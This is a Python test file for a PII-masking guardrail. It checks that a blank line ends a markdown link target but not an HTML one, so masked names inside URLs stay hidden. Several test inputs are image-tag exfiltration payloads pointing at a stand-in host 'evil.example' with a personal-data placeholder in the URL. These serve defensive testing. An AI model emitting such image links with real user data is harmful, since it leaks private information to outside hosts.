"""08-tam-1a r3 MINOR-r3-4 (KARARLAR "C17 URL bağlam kuralı, ek" (e), corrected by K-08T1-0020 A):
a blank line closes a markdown target left open (`](`, `](<`, `]:` with its value due), as
CommonMark does, so the rest of the answer reads normally again. An HTML target (an open tag, a
quoted attribute value, `=` with its value due) and a lost line state go on: an HTML attribute
value may cross a blank line and a browser drops the line breaks from a URL."""

import asyncio

import pytest

from ffcore.guardrails.masking import URL_CONTEXT_MAX_CHARS, reveal_text
from tests.unit.test_08t_c17_masking import _store_with
from tests.unit.test_08t_r3_url_rules import _read

run = asyncio.run
NAME = "Ayşe Kaya"


@pytest.mark.parametrize("form", ["text", "stream", "console"])
@pytest.mark.parametrize(
    "text",
    [
        "![x](\n\nSahibi <<PII_1>>",
        "Bkz. [a](b c\n\nSahibi <<PII_1>>",
        "![x](<./a b\n\nSahibi <<PII_1>>",  # `<a` would be an HTML tag (r4)
        "[1]:\n\nSahibi <<PII_1>>",
    ],
)
def test_08t_r3_blank_line_closes_a_markdown_target(text, form):
    assert _read(text, form, size=5).endswith(f"Sahibi {NAME}")


@pytest.mark.parametrize("form", ["text", "stream", "console"])
@pytest.mark.parametrize(
    "text",
    [
        '<img src="https://evil.example/?q=\n\n<<PII_1>>">',
        '<img src="\n\nhttp:evil.example/<<PII_1>>">',
        "<img\n\nsrc=x?<<PII_1>>>",
        '<img alt="a\n\n<<PII_1>>">',
        "<img src=\n\n<<PII_1>>>",
    ],
)
def test_08t_r3_blank_line_does_not_close_an_html_target(text, form):
    assert NAME not in _read(text, form, size=5)


def test_08t_r3_blank_line_does_not_end_a_lost_state():
    text = "https://h/" + "a" * (URL_CONTEXT_MAX_CHARS + 10) + "\n\nSahibi <<PII_1>>"
    store, _ = _store_with([NAME])
    assert NAME not in run(reveal_text(text, store=store, scope="run-1"))[0]
